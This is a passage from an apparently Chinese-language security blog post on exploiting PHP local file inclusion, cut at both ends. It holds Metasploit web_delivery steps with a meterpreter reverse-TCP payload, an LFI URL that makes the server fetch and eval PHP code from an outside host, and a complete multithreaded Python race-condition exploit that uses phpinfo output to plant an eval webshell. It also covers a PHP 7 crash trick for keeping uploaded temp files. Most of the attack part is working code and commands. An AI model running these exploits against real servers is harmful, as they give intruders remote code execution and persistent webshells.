exploit/multi/script/web_delivery</span><br><span class=\"line\">msf exploit (web_delivery)&gt;set target 1</span><br><span class=\"line\">msf exploit (web_delivery)&gt; set payload php/meterpreter/reverse_tcp</span><br><span class=\"line\">msf exploit (web_delivery)&gt; set lhost 192.168.1.123</span><br><span class=\"line\">msf exploit (web_delivery)&gt;set srvport 8081</span><br><span class=\"line\">msf exploit (web_delivery)&gt;exploit</span><br></pre></td></tr></table></figure>\n<p>执行 msf 给出的命令</p>\n<p><code>http://10.128.50.84:18888/lfi.php?file=./shabi.php&amp;cmd=php -d allow_url_fopen=true -r &quot;eval(file_get_contents('http://192.168.13.133:9891/GEZgpb8cVDe', false, stream_context_create(['ssl'=&gt;['verify_peer'=&gt;false,'verify_peer_name'=&gt;false]])));&quot;</code></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031201754444.png\" alt=\"image-20221031201754444\"></p>\n<p>CS web delivery</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221101145322747.png\" alt=\"image-20221101145322747\" style=\"zoom:80%;\" />\n<h2 id=\"包含procselfenviron\"><a class=\"markdownIt-Anchor\" href=\"#包含procselfenviron\">#</a> 包含 / PROC/SELF/ENVIRON</h2>\n<p>并不能包含这东西～</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# ls -al /proc/self/environ </span><br><span class=\"line\">-r-------- 1 root root 0 Nov  1 14:56 /proc/self/environ</span><br></pre></td></tr></table></figure>\n<p>而且不能 chmod 改变权限</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# chmod 755 /proc/self/environ </span><br><span class=\"line\">chmod: changing permissions of ‘/proc/self/environ’: Operation not permitted</span><br></pre></td></tr></table></figure>\n<p>也不能修改特殊权限位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos CobaltStrike4.1]# lsattr /proc/self/environ </span><br><span class=\"line\">lsattr: Inappropriate ioctl for device While reading flags on /proc/self/environ</span><br></pre></td></tr></table></figure>\n<p>关于 chattr</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@VM-16-11-centos lighthouse]# chattr +i 11111.exe </span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br><span class=\"line\">rm: cannot remove ‘11111.exe’: Operation not permitted</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# lsattr 11111.exe </span><br><span class=\"line\">----i--------e-- 11111.exe</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# chattr -i 11111.exe</span><br><span class=\"line\">[root@VM-16-11-centos lighthouse]# rm -rf 11111.exe </span><br></pre></td></tr></table></figure>\n<h2 id=\"phpinfo文件包含\"><a class=\"markdownIt-Anchor\" href=\"#phpinfo文件包含\">#</a> phpinfo 文件包含</h2>\n<p>php 5.x</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Configuration File (php.ini) Path\tC:\\Windows</span><br><span class=\"line\">Loaded Configuration File\tD:\\BtSoft\\php\\54\\php.ini</span><br><span class=\"line\">PHP Version\t5.4.45</span><br><span class=\"line\">allow_url_fopen\tOn\tOn</span><br><span class=\"line\">allow_url_include\tOn\tOn</span><br><span class=\"line\">session.save_path\tD:\\BtSoft\\temp\\session\tD:\\BtSoft\\temp\\session</span><br><span class=\"line\">disable_functions\tno value\tno value</span><br><span class=\"line\">_SERVER[&quot;*********&quot;]\tC:\\Windows</span><br></pre></td></tr></table></figure>\n<p><span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMToxODg4OC9waHBpbmZvLnBocA==\">http://127.0.0.1:18888/phpinfo.php</span> 我们可以向 phpinfo 中 post 参数，虽然没有接收，但会生成临时文件，我们可以利用时间竞争包含</p>\n<p>当然可以向任意 php 文件 post 文件，服务器都会将他保存到一个临时文件中，只是如果没有 phpinfo，临时文件名很难猜。然而 phpinfo 中会有文件名和路径的输出</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"><span class=\"keyword\">from</span> io <span class=\"keyword\">import</span> BytesIO</span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\">files = &#123;</span><br><span class=\"line\">  <span class=\"string\">&#x27;file&#x27;</span>: <span class=\"string\">&quot;&lt;?php echo &#x27;yanchuang is cool!&#x27;;&quot;</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\">url = <span class=\"string\">&quot;http://172.16.60.64/xss_location/include/phpinfo.php&quot;</span></span><br><span class=\"line\">r = requests.post(url=url, files=files, allow_redirects=<span class=\"literal\">False</span>)</span><br><span class=\"line\">data = re.search(<span class=\"string\">&quot;(?&lt;=tmp_name] =&amp;gt; ).*&quot;</span>, r.content.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)).group(<span class=\"number\">0</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(data)</span><br></pre></td></tr></table></figure>\n<p>为了延缓删除临时文件，我们需要 post 更长的文件，通知启用大量线程</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> threading</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"><span class=\"keyword\">import</span> time</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">setup</span>(<span class=\"params\">host, port</span>):</span><br><span class=\"line\">    TAG = <span class=\"string\">&quot;Security Test&quot;</span></span><br><span class=\"line\">    PAYLOAD = <span class=\"string\">&quot;&quot;&quot;%s\\r</span></span><br><span class=\"line\"><span class=\"string\">&lt;?php fputs(fopen(&#x27;/tmp/g&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[a]);&#x27;)?&gt;\\r&quot;&quot;&quot;</span> % TAG</span><br><span class=\"line\">    REQ1_DATA = <span class=\"string\">&quot;&quot;&quot;-----------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Disposition: form-data; name=&quot;dummyname&quot;; filename=&quot;test.txt&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: text/plain\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s</span></span><br><span class=\"line\"><span class=\"string\">-----------------------------7dbff1ded0714--\\r&quot;&quot;&quot;</span> % PAYLOAD</span><br><span class=\"line\">    padding = <span class=\"string\">&quot;A&quot;</span> * <span class=\"number\">5000</span></span><br><span class=\"line\">    REQ1 = <span class=\"string\">&quot;&quot;&quot;POST /phpinfo.php?a=&quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot; HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">Cookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=&quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_USER_AGENT: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_ACCEPT_LANGUAGE: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">HTTP_PRAGMA: &quot;&quot;&quot;</span> + padding + <span class=\"string\">&quot;&quot;&quot;\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\r</span></span><br><span class=\"line\"><span class=\"string\">Content-Length: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">%s&quot;&quot;&quot;</span> % (<span class=\"built_in\">len</span>(REQ1_DATA), host, REQ1_DATA)</span><br><span class=\"line\">    <span class=\"comment\"># modify this to suit the LFI script</span></span><br><span class=\"line\">    LFIREQ = <span class=\"string\">&quot;&quot;&quot;GET /lfi.php?file=%s HTTP/1.1\\r</span></span><br><span class=\"line\"><span class=\"string\">User-Agent: Mozilla/4.0\\r</span></span><br><span class=\"line\"><span class=\"string\">Proxy-Connection: Keep-Alive\\r</span></span><br><span class=\"line\"><span class=\"string\">Host: %s\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">\\r</span></span><br><span class=\"line\"><span class=\"string\">&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (REQ1, TAG, LFIREQ)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">phpInfoLFI</span>(<span class=\"params\">host, port, phpinforeq, offset, lfireq, tag</span>):</span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\"></span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s2.connect((host, port))</span><br><span class=\"line\"></span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\">    d = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"built_in\">len</span>(d) &lt; offset:</span><br><span class=\"line\">        d += s.recv(offset)</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        i = d.index(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">        fn = d[i + <span class=\"number\">17</span>:i + <span class=\"number\">44</span>]</span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\"></span><br><span class=\"line\">    s2.send(lfireq % (fn, host))</span><br><span class=\"line\">    d = s2.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    s2.close()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> d.find(tag) != -<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> fn</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">counter = <span class=\"number\">0</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ThreadWorker</span>(threading.Thread):</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, e, l, m, *args</span>):</span><br><span class=\"line\">        threading.Thread.__init__(self)</span><br><span class=\"line\">        self.event = e</span><br><span class=\"line\">        self.lock = l</span><br><span class=\"line\">        self.maxattempts = m</span><br><span class=\"line\">        self.args = args</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">run</span>(<span class=\"params\">self</span>):</span><br><span class=\"line\">        <span class=\"keyword\">global</span> counter</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> self.event.is_set():</span><br><span class=\"line\">            <span class=\"keyword\">with</span> self.lock:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= self.maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">return</span></span><br><span class=\"line\">                counter += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                x = phpInfoLFI(*self.args)</span><br><span class=\"line\">                <span class=\"keyword\">if</span> self.event.is_set():</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">                <span class=\"keyword\">if</span> x:</span><br><span class=\"line\">                    <span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nGot it! Shell created in /tmp/g&quot;</span></span><br><span class=\"line\">                    self.event.<span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">except</span> socket.error:</span><br><span class=\"line\">                <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">getOffset</span>(<span class=\"params\">host, port, phpinforeq</span>):</span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;Gets offset of tmp_name in the php output&quot;&quot;&quot;</span></span><br><span class=\"line\">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">    s.connect((host, port))</span><br><span class=\"line\">    s.send(phpinforeq)</span><br><span class=\"line\"></span><br><span class=\"line\">    d = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">        i = s.recv(<span class=\"number\">4096</span>)</span><br><span class=\"line\">        d += i</span><br><span class=\"line\">        <span class=\"keyword\">if</span> i == <span class=\"string\">&quot;&quot;</span>:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"comment\"># detect the final chunk</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> i.endswith(<span class=\"string\">&quot;0\\r\\n\\r\\n&quot;</span>):</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    s.close()</span><br><span class=\"line\">    i = d.find(<span class=\"string\">&quot;[tmp_name] =&amp;gt; &quot;</span>)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> i == -<span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">raise</span> ValueError(<span class=\"string\">&quot;No php tmp_name in phpinfo output&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;found %s at %i&quot;</span> % (d[i:i + <span class=\"number\">10</span>], i)</span><br><span class=\"line\">    <span class=\"comment\"># padded up a bit</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> i + <span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">main</span>():</span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;LFI With PHPInfo()&quot;</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;-=&quot;</span> * <span class=\"number\">30</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(sys.argv) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Usage: %s host [port] [threads]&quot;</span> % sys.argv[<span class=\"number\">0</span>]</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        host = socket.gethostbyname(sys.argv[<span class=\"number\">1</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> socket.error, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with hostname %s: %s&quot;</span> % (sys.argv[<span class=\"number\">1</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    port = <span class=\"number\">80</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        port = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with port %d: %s&quot;</span> % (sys.argv[<span class=\"number\">2</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    poolsz = <span class=\"number\">10</span></span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        poolsz = <span class=\"built_in\">int</span>(sys.argv[<span class=\"number\">3</span>])</span><br><span class=\"line\">    <span class=\"keyword\">except</span> IndexError:</span><br><span class=\"line\">        <span class=\"keyword\">pass</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> ValueError, e:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;Error with poolsz %d: %s&quot;</span> % (sys.argv[<span class=\"number\">3</span>], e)</span><br><span class=\"line\">        sys.exit(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Getting initial offset...&quot;</span>,</span><br><span class=\"line\">    reqphp, tag, reqlfi = setup(host, port)</span><br><span class=\"line\">    offset = getOffset(host, port, reqphp)</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    maxattempts = <span class=\"number\">1000</span></span><br><span class=\"line\">    e = threading.Event()</span><br><span class=\"line\">    l = threading.Lock()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Spawning worker pool (%d)...&quot;</span> % poolsz</span><br><span class=\"line\">    sys.stdout.flush()</span><br><span class=\"line\"></span><br><span class=\"line\">    tp = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, poolsz):</span><br><span class=\"line\">        tp.append(ThreadWorker(e, l, maxattempts, host, port, reqphp, offset, reqlfi, tag))</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.start()</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"keyword\">not</span> e.wait(<span class=\"number\">1</span>):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">                <span class=\"keyword\">break</span></span><br><span class=\"line\">            <span class=\"keyword\">with</span> l:</span><br><span class=\"line\">                sys.stdout.write(<span class=\"string\">&quot;\\r% 4d / % 4d&quot;</span> % (counter, maxattempts))</span><br><span class=\"line\">                sys.stdout.flush()</span><br><span class=\"line\">                <span class=\"keyword\">if</span> counter &gt;= maxattempts:</span><br><span class=\"line\">                    <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"built_in\">print</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> e.is_set():</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&quot;Woot!  \\m/&quot;</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"string\">&quot;:(&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span> KeyboardInterrupt:</span><br><span class=\"line\">        <span class=\"built_in\">print</span> <span class=\"string\">&quot;\\nTelling threads to shutdown...&quot;</span></span><br><span class=\"line\">        e.<span class=\"built_in\">set</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"built_in\">print</span> <span class=\"string\">&quot;Shuttin&#x27; down...&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> t <span class=\"keyword\">in</span> tp:</span><br><span class=\"line\">        t.join()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"lfiphp7-collapse\"><a class=\"markdownIt-Anchor\" href=\"#lfiphp7-collapse\">#</a> LFI+php7 collapse</h2>\n<p>php 7.0-7.1.19</p>\n<p>当不存在 phpinfo 时，可以利用 php7 的特性</p>\n<p><code>http://ip/index.php?file=php://filter/string.strip_tags=/etc/passwd</code>  导致 php 崩溃，临时文件遗留了下来</p>\n<p>在上传时抓包，使用以上 payload 进行崩溃</p>\n<p>接下来需要找到刚刚的临时文件</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$a = @$_GET[&#x27;dir&#x27;];</span><br><span class=\"line\">if(!$a)&#123;</span><br><span class=\"line\">$a = &#x27;/tmp&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">var_dump(scandir($a));</span><br></pre></td></tr></table></figure>\n<p>然后写 shell 包含随便搞</p>\n<p>两种崩溃方法：</p>\n<p>抓包时修改</p>\n<p>先写个文件上传页面，上传时抓包，修改 url 和文件内容</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /upload_file.php?file=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1</span><br><span class=\"line\">Host: 127.0.0.1:18888</span><br><span class=\"line\">Content-Length: 290</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">sec-ch-ua: &quot;Chromium&quot;;v=&quot;97&quot;, &quot; Not;A Brand&quot;;v=&quot;99&quot;</span><br><span class=\"line\">sec-ch-ua-mobile: ?0</span><br><span 